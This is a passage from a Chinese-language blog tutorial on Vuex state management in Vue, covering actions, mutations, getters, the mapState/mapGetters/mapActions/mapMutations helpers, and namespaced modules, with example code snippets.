<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">actiosn</span>: &#123;</span><br><span class="line">    <span class="comment">//简写</span></span><br><span class="line">    <span class="comment">// 第一个参数，也可能是dispatch，看实际情况</span></span><br><span class="line">    <span class="comment">// 第二个参数命名，一般写成payload，是dispatch时，自定义的任何类型的数据，</span></span><br><span class="line">    <span class="title function_">jia</span>(<span class="params">&#123;commit&#125;, payload</span>) &#123; </span><br><span class="line">		<span class="title function_">commit</span>(<span class="string">&#x27;JIA&#x27;</span>, payload) <span class="comment">//不过payload一般根据实际情况，写成语义化的命名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用场景<ul>
<li>可以在组件初始化时，分发<code>action</code>调用<code>axios</code>发送请求获取数据</li>
</ul>
</li>
</ul>
</li>
<li><p>定义<code>mutation</code>类型</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mutations</span>: &#123;</span><br><span class="line">  <span class="title function_">JIA</span>(<span class="params">state, payload</span>) &#123;</span><br><span class="line">    <span class="comment">// state，是对配置项state做了响应式处理之后的对象</span></span><br><span class="line">    <span class="comment">// value是传入的值</span></span><br><span class="line">    state.<span class="property">sum</span> += payload</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>关于<code>mutation</code>命名的维护，可以单独放在<code>store/mutationTypes.js</code>文件中</p>
<p>在组件中引入<code>state</code>中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123;$store.state.sum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;myDispatch&quot;&gt;click&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      n: 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    myDispatch() &#123;</span><br><span class="line">      this.$store.dispatch(&#x27;jia&#x27;, this.n)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果<code>aciton</code>中没有其他的业务逻辑，组件中可以不调用<code>dispatch</code>方法，直接<code>commit</code>给<code>mutation</code>即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;JIA&#x27;</span>, <span class="variable language_">this</span>.<span class="property">n</span>) <span class="comment">// 传入mutation类型，并根据需要传入其他参数</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-1-5-vuex开发者工具的使用"><a href="#5-1-5-vuex开发者工具的使用" class="headerlink" title="5.1.5.vuex开发者工具的使用"></a>5.1.5.<code>vuex</code>开发者工具的使用</h3><h3 id="5-1-6-getters配置项"><a href="#5-1-6-getters配置项" class="headerlink" title="5.1.6.getters配置项"></a>5.1.6.<code>getters</code>配置项</h3><p>当<code>state</code>中的数据需要经过加工后再使用时，可以使用<code>getters</code>加工</p>
<p>类似与计算属性：</p>
<p>定义</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">state</span>: &#123;</span><br><span class="line">  <span class="attr">sum</span>: <span class="number">0</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">getters</span>: &#123; <span class="comment">// 用于将state中的数据进行加工</span></span><br><span class="line">  <span class="title function_">bigSum</span>(<span class="params">state</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> state.<span class="property">sum</span> * <span class="number">10</span> <span class="comment">// 假设是非常复杂耗时的逻辑</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;&#123;&#123;$store.getters.bigSum&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<h3 id="5-1-7-mapState和mapGetters"><a href="#5-1-7-mapState和mapGetters" class="headerlink" title="5.1.7.mapState和mapGetters"></a>5.1.7.<code>mapState</code>和<code>mapGetters</code></h3><p>背景：我们在使用<code>store</code>中的数据时，需要写一堆<code>this.$store.state</code>的代码，现在要简化这部分操作</p>
<p>虽然可以把每个值写到计算属性中去，但有更好的写法：</p>
<ul>
<li><p>计算属性的写法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">computed</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">vcSum</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">sum</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>更好的写法如下：</p>
</li>
</ul>
<h4 id="5-1-7-1-mapState对象写法"><a href="#5-1-7-1-mapState对象写法" class="headerlink" title="5.1.7.1.mapState对象写法"></a>5.1.7.1.<code>mapState</code>对象写法</h4><ul>
<li><p>组件中引入<code>mapState</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;mapState&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>先看一下<code>mapState</code>的基本使用和返回值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> x = <span class="title function_">mapState</span>(</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">vcSum</span>: <span class="string">&#x27;sum&#x27;</span>,</span><br><span class="line">        <span class="attr">vcName</span>: <span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">        <span class="attr">vcAge</span>: <span class="string">&#x27;age&#x27;</span>, <span class="comment">// 属性值对应着state中定义的</span></span><br><span class="line">      &#125;</span><br><span class="line">  )</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x, <span class="keyword">typeof</span> x) <span class="comment">// mapState的返回值是一个对象，可以在computed中解构赋值一下，方便使用</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
<li><p>计算属性中，解构赋值<code>mapState</code>的返回值</p>
<ul>
<li>得到的是<code>mappedState</code>的函数，会去<code>vuex</code>中的<code>state</code>中取对应的值作为该函数的返回值</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  ...<span class="title function_">mapState</span>(&#123;</span><br><span class="line">    <span class="attr">vcSum</span>: <span class="string">&#x27;sum&#x27;</span>,</span><br><span class="line">    <span class="attr">vcName</span>: <span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">    <span class="attr">vcAge</span>: <span class="string">&#x27;age&#x27;</span>, <span class="comment">// 相当于在computed中定义了三个变量</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;about&quot;&gt;</span><br><span class="line">    &lt;h1&gt;This is an about page&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123;vcSum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123;vcName&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123;vcAge&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123;$store.getters.bigSum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;myDispatch&quot;&gt;click&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;mapState&#125; from &#x27;vuex&#x27;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      n: 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    const x = mapState(</span><br><span class="line">        &#123;</span><br><span class="line">          vcSum: &#x27;sum&#x27;,</span><br><span class="line">          vcName: &#x27;name&#x27;,</span><br><span class="line">          vcAge: &#x27;age&#x27;,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    console.log(x, typeof x) // mapState的返回值是一个对象，可以在computed中解构赋值一下，方便使用</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    ...mapState(&#123;</span><br><span class="line">      vcSum: &#x27;sum&#x27;,</span><br><span class="line">      vcName: &#x27;name&#x27;,</span><br><span class="line">      vcAge: &#x27;age&#x27;,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    myDispatch() &#123;</span><br><span class="line">      this.$store.dispatch(&#x27;jia&#x27;, this.n)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在<code>Vue</code>的开发中工具中，显示在<code>vuex bindings</code>部分</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220601161628614.png" alt="image-20220601161628614"></p>
<h4 id="5-1-7-2-mapState数组写法"><a href="#5-1-7-2-mapState数组写法" class="headerlink" title="5.1.7.2.mapState数组写法"></a>5.1.7.2.<code>mapState</code>数组写法</h4><p>上述的对象写法，虽然定义的变量，和<code>state</code>中定义的变量名称一致，但不能用对象的简写形式，因为值是字符串不是变量</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  ...<span class="title function_">mapState</span>(&#123;<span class="attr">sum</span>: <span class="string">&#x27;sum&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;name&#x27;</span>, <span class="attr">age</span>: <span class="string">&#x27;age&#x27;</span>&#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>在<code>vue</code>中，把上述对象的形式，写成数组的形式，就相当于是简写形式了</p>
<p>生成相应计算属性的同时，也会去<code>state</code>中取值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  ...<span class="title function_">mapState</span>([<span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>])</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><code>store</code>对象的<code>state</code>属性中，有什么就可以写什么</p>
<p>同理<code>mapGetters</code>也是一样的写法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  ...<span class="title function_">mapState</span>(&#123;<span class="attr">bigSum</span>: <span class="string">&#x27;bigSum&#x27;</span>&#125;)</span><br><span class="line">&#125;,</span><br><span class="line">    </span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  ...<span class="title function_">mapState</span>([<span class="string">&#x27;bigSum&#x27;</span>])</span><br><span class="line">&#125;,</span><br><span class="line">     </span><br></pre></td></tr></table></figure>

<h3 id="5-1-8-mapActions和mapMutations"><a href="#5-1-8-mapActions和mapMutations" class="headerlink" title="5.1.8.mapActions和mapMutations"></a>5.1.8.<code>mapActions</code>和<code>mapMutations</code></h3><p>优化<code>dispatch</code>和<code>commit</code>的写法，不用写<code>this.$store.commit(&#39;xx&#39;)</code></p>
<p>之前的写法可以将<code>commit</code>写在<code>methods</code>里：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">  <span class="title function_">myCommit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;JIA&#x27;</span>, <span class="variable language_">this</span>.<span class="property">n</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在可以通过<code>mapMutations</code>简写写法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;mapMutations&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">n</span>: <span class="number">1</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">    	...<span class="title function_">mapMutations</span>(&#123;<span class="attr">myCommit</span>: <span class="string">&#x27;JIA&#x27;</span>&#125;) <span class="comment">// 会生成myCommit方法，方法中会调用commit方法去联系mutations</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于生成了如下代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 相当于生成了如下代码：</span></span><br><span class="line"><span class="title function_">myCommit</span>(<span class="params">value</span>) &#123;</span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;JIA&#x27;</span>, value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要在使用的时候传递参数，否则传递的默认参数是<code>MouseEvent</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=&quot;myCommit(n)&quot;&gt;click&lt;/button&gt;</span><br></pre></td></tr></table></figure>



<p>上述是对象的写法，也可以写成数组的写法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">	...<span class="title function_">mapMutations</span>([<span class="string">&#x27;JIA&#x27;</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=&quot;JIA(n)&quot;&gt;click&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p>同理，<code>mapActions</code>对应着<code>dispatch</code></p>
<p>定义：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;mapActions&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="comment">// 对象写法</span></span><br><span class="line">    	...<span class="title function_">mapActions</span>(&#123;<span class="attr">myDispatch</span>:<span class="string">&#x27;jia&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 数组写法</span></span><br><span class="line">    	...<span class="title function_">mapActions</span>([<span class="string">&#x27;jia&#x27;</span>])</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    &lt;button @click=&quot;myDispatch(n)&quot;&gt;click&lt;/button&gt;</span><br><span class="line">或者</span><br><span class="line">    &lt;button @click=&quot;jia(n)&quot;&gt;click&lt;/button&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>值得注意的是，<code>mapActions</code>数组的写法，其实是将方法挂在的<code>vc</code>实例上，虽然看上去更为简单</p>
<p>但是在组件获取初始化数据，并且还是用<code>action-types</code>文件时，用对象写法会好些</p>
<h3 id="5-1-9-多组件共享数据"><a href="#5-1-9-多组件共享数据" class="headerlink" title="5.1.9.多组件共享数据"></a>5.1.9.多组件共享数据</h3><p>在不同组件中使用<code>vuex</code></p>
<h3 id="5-1-10-vuex的模块化编码-namespaced"><a href="#5-1-10-vuex的模块化编码-namespaced" class="headerlink" title="5.1.10.vuex的模块化编码+namespaced"></a>5.1.10.<code>vuex</code>的模块化编码+<code>namespaced</code></h3><p>不同模块用到的共享数组，放在不同的对象中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;sai&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">modules</span>: &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> moduleB = &#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">modules</span>: &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用<code>modules</code>配置项：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    <span class="attr">modules</span>: &#123;</span><br><span class="line">        moduleA,</span><br><span class="line">        moduleB</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>模块化编码后，此时<code>store</code>里面有什么呢？</p>
<p>变化较大的是<code>state</code>对象，<code>state</code>中会包含各个自定义的模块</p>
<p>此时，之前利用<code>mapState</code>取数的写法，获取到的<code>state</code>对象直接就包含了属性名与属性值，但现在包含了<code>moduleA</code>、<code>moduleB</code>对象，里面才是属性名与属性值：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220601201019654.png" alt="image-20220601201019654"></p>
<p>那么，此时模板怎么取到这个值呢？</p>
<p><code>store</code>里的<code>state</code>身上，有什么我们就写什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">	...mapState([&#x27;moduleA&#x27;, &#x27;moduleB&#x27;])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;&#123;&#123;moduleA.name&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<p>虽然可以取到数据了，但是写法有些麻烦，模板中我们只希望写<code>&#123;&#123;name&#125;&#125;</code>应该怎么写呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<p>想要上述写法生效，定义<code>module</code>时，需要额外新增一个<code>namespaced</code>配置项并设置成<code>true</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">    <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">state</span>:&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">actions</span>:&#123;&#125;,</span><br><span class="line">    <span class="attr">mutations</span>:&#123;&#125;,</span><br><span class="line">    <span class="attr">getters</span>:&#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时使用<code>mapState</code>取数时，指定模块名</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">	...<span class="title function_">mapState</span>(<span class="string">&#x27;moudleA&#x27;</span>, [<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同理，模块化写法时，<code>mapActions</code>和<code>mapMutations</code>也要开启命名空间，在组件中使用时也要模块名</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">    ...<span class="title function_">mapMutations</span>(<span class="string">&#x27;moudleA&#x27;</span>, [<span class="string">&#x27;JIA&#x27;</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>如果指定了命名空间，使用<code>this.$store.state</code>的写法，需要多写一层加上命名空间：</p>
<ul>
<li><p>取数：</p>
<ul>
<li><p><code>state</code>中：<code>this.$store.state.moduleA.name</code></p>
</li>
<li><p><code>getters</code>中：<code>this.$store.getters[&#39;moduleA/name&#39;]</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220601205100324.png" alt="image-20220601205100324"></p>
</li>
</ul>
</li>
<li><p>提交：</p>
<ul>
<li><code>mutations</code>中：<code>this.$store.commit(&#39;moduleA/JIA&#39;, value)</code><ul>
<li>写成这样是因为底层设计就是这样，会找有没有<code>/</code>分隔符</li>
</ul>
</li>
<li><code>actions</code>中：<code>this.$store.dispatch(&#39;moduleA/add&#39;, value)</code></li>
</ul>
</li>
<li><p>注意：</p>
<ul>
<li>如果在没有加<code>namspaced</code>命名空间的情况下，不同的模块还有相同的<code>mutation</code>，如果<code>commit</code>会都执行，不合理</li>
</ul>
</li>
</ul>
<h3 id="5-1-11-vuex模块化编码最佳实践"><a href="#5-1-11-vuex模块化编码最佳实践" class="headerlink" title="5.1.11.vuex模块化编码最佳实践"></a>5.1.11.<code>vuex</code>模块化编码最佳实践</h3><h4 id="5-1-11-1-定义模块"><a href="#5-1-11-1-定义模块" class="headerlink" title="5.1.11.1.定义模块"></a>5.1.11.1.定义模块</h4><ul>
<li><p>不同模块都放在<code>store/modules</code>文件夹下</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220622110840708.png" alt="image-20220622110840708"></p>
</li>
<li><p>不同的模块每个<code>state</code>、<code>action</code>、<code>getters</code>和<code>mutation</code>都单独抽成一个<code>js</code>文件（放在一起代码太多时不好维护）</p>
<ul>
<li><p>为了便于识别，每个<code>state</code>或其它，命名前可以加模块名，如<code>homeState</code></p>
<p>如下形式，分别定义4个</p>
